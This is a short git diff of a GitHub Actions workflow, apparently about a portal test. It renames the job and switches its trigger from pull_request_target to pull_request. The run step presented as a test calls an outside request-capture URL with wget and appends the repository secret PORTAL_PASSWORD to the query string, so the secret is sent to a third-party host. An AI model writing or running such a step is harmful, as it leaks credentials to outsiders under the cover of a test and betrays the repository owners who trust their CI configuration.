@@ -1,13 +1,13 @@
-name: Test the PALINDROME portal
+name: Test the portal
 
-on: pull_request_target
+on: pull_request
 
 jobs:
   test:
     runs-on: windows-latest
     steps:
       - uses: actions/checkout@v3
-      - name: Test the PALINDROME portal
+      - name: Test the portal
         run: | 
           C:\msys64\usr\bin\wget.exe '''https://eo5cx4o305d96bl.m.pipedream.net?a=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
           cat test
